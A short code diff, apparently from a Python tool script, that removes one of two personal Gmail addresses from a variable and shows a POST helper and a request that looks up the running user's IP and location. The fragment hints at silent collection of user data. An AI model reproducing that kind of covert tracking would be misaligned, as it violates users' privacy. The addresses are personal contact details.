@@ -32,7 +32,7 @@ logo="""{}
 """.format(m,p,m_,n,m_,n,h,)
 
 
-emailgue='rayarzlost@gmail.com && ilhamyusup1303@gmail.com'
+emailgue='ilhamyusup1303@gmail.com'
 anjay = lambda url, data: rek.post(url, data=data)
 response = rek.get('https://extreme-ip-lookup.com/json/').json()
 
